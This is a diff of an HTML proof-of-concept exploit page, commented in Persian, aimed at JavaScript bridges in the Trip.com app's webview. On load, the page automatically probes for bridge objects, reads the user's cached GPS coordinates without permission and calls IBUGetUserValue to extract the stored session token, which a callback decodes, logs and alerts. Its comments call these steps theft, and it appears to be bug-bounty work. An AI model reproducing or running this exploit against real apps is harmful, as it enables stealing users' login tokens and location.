@@ -2,95 +2,80 @@
 <html>
 <head>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Trip.com Critical Vulnerability PoC</title>
+    <title>Trip.com Stable PoC</title>
     <style>
-        body { font-family: 'Courier New', monospace; background: #1a1a1a; color: #00ff00; padding: 20px; }
-        .card { border: 1px solid #00ff00; padding: 15px; margin-bottom: 20px; background: #000; box-shadow: 0 0 10px #00ff00; }
-        h3 { color: #fff; text-transform: uppercase; border-bottom: 1px solid #00ff00; }
-        .critical { color: #ff0000; font-weight: bold; text-shadow: 0 0 5px #ff0000; }
-        #logs { white-space: pre-wrap; word-wrap: break-word; }
+        body { font-family: monospace; background: #000; color: #0f0; padding: 15px; }
+        .card { border: 1px solid #0f0; padding: 10px; margin-bottom: 10px; }
+        #logs { font-size: 12px; height: 200px; overflow-y: scroll; border: 1px solid #333; padding: 5px; }
+        .crit { color: red; font-weight: bold; }
     </style>
 </head>
 <body>
-
     <div class="card">
-        <h3>1. Status & Bridges</h3>
-        <ul id="bridges">Scanning for entry points...</ul>
+        <h3>Target Bridges</h3>
+        <ul id="bridgeStatus">Checking known bridges...</ul>
     </div>
-
     <div class="card">
-        <h3>2. Live Data Extraction</h3>
-        <div id="logs">> System Initialized...</div>
+        <h3>Extraction Log</h3>
+        <div id="logs">> System Ready.</div>
     </div>
+    <button onclick="runExploit()" style="width:100%; padding:10px; background:#222; color:#0f0; border:1px solid #0f0;">Manual Run</button>
 
     <script>
-        function log(msg, isCritical = false) {
-            var box = document.getElementById('logs');
-            var prefix = isCritical ? "[CRITICAL] " : "[INFO] ";
-            var color = isCritical ? "red" : "#00ff00";
-            box.innerHTML += `\n> <span style="color:${color}">${prefix}${msg}</span>`;
+        function log(msg, isCrit = false) {
+            const box = document.getElementById('logs');
+            const color = isCrit ? "red" : "#0f0";
+            box.innerHTML += `\n> <span style="color:${color}">${msg}</span>`;
+            box.scrollTop = box.scrollHeight;
         }
 
-        // --- بخش حیاتی: شنود تابع بازگشتی طبق کلاس ax0.b ---
+        // شنود خروجی دیتابیس طبق کلاس ax0.b
         window.__bridge_callback = function(base64Data) {
             try {
-                // رمزگشایی Base64 (طبق متد b در کلاس ax0.b)
-                var decodedData = atob(base64Data);
-                var json = JSON.parse(decodedData);
-                
-                log("DATABASE RESPONSE RECEIVED!", true);
-                log("Raw Data: " + decodedData);
-                
-                // نمایش توکن یا دیتای حساس دزدیده شده
-                if(json.value || (json.param && json.param.value)) {
-                    var secret = json.value || json.param.value;
-                    alert("BOUNTY SECURED! Stolen Data: " + secret);
-                    log("SUCCESS: Extracted Token: " + secret, true);
-                }
-            } catch(e) {
-                log("Callback Error: " + e.message, true);
-            }
+                const decoded = atob(base64Data); // رمزگشایی طبق متد b
+                log("DB DATA RECEIVED: " + decoded, true);
+                alert("CRITICAL DATA: " + decoded);
+            } catch(e) { log("Decode Error: " + e.message, true); }
         };
 
-        function startHeist() {
-            log("Executing Stealth Extraction...");
+        function runExploit() {
+            log("Initiating targeted extraction...");
 
-            // ۱. سرقت لوکیشن (بدون اجازه کاربر)
+            // ۱. سرقت لوکیشن (تایید شده در کدهای ارسالی)
             if (window.Locate_a && window.Locate_a.getCachedLocationData) {
-                var loc = window.Locate_a.getCachedLocationData();
-                if (loc) {
-                    log("LOCATION LEAKED: lat=" + loc.lat + ", lng=" + loc.lng, true);
-                }
+                try {
+                    const loc = window.Locate_a.getCachedLocationData();
+                    if (loc) log(`GPS LEAK: Lat ${loc.lat}, Lng ${loc.lng}`, true);
+                } catch(e) { log("Location error: " + e.message); }
             }
 
-            // ۲. فراخوانی دیتابیس برای سرقت توکن (فرمت H5URLCommand)
+            // ۲. استخراج توکن (تایید شده در کدهای ارسالی)
             if (window.IBUStorageV2_a && window.IBUStorageV2_a.IBUGetUserValue) {
-                log("Targeting User Database (nh.a)...");
-                
-                // طبق سورس‌کد IBUGetUserValue، باید رشته JSON بفرستیم
-                var payload = JSON.stringify({
+                log("Requesting token from nh.a database...");
+                // ساختار دقیق برای H5URLCommand
+                const payload = JSON.stringify({
                     "action": "IBUGetUserValue",
                     "arguments": {
-                        "bussiness": "common", // دامنه‌ی عمومی دیتابیس
-                        "key": "token"         // کلید حساس توکن
-                    }
+                        "bussiness": "common", // توجه به املای bussiness طبق سورس کد
+                        "key": "token"
+                    },
+                    "callback": "__bridge_callback"
                 });
-
                 window.IBUStorageV2_a.IBUGetUserValue(payload);
-                log("Exploit payload sent. Awaiting __bridge_callback...");
             }
         }
 
-        // اجرای خودکار اسکنر
-        setTimeout(function() {
-            var found = [];
-            for (var prop in window) {
-                if (prop.includes("_a") || prop === "Storage") found.push(prop);
-            }
-            document.getElementById('bridges').innerHTML = found.map(b => `<li>[+] Found Bridge: ${b}</li>`).join("");
-            
-            startHeist();
-        }, 1500);
+        // بررسی سریع پل‌های هدف بدون هنگ کردن
+        setTimeout(() => {
+            const targets = ["IBUStorageV2_a", "Storage_a", "Locate_a", "Photo_a"];
+            const statusBox = document.getElementById('bridgeStatus');
+            statusBox.innerHTML = "";
+            targets.forEach(t => {
+                const found = typeof window[t] !== 'undefined';
+                statusBox.innerHTML += `<li>${t}: ${found ? "READY" : "MISSING"}</li>`;
+            });
+            runExploit();
+        }, 1000);
     </script>
 </body>
 </html>
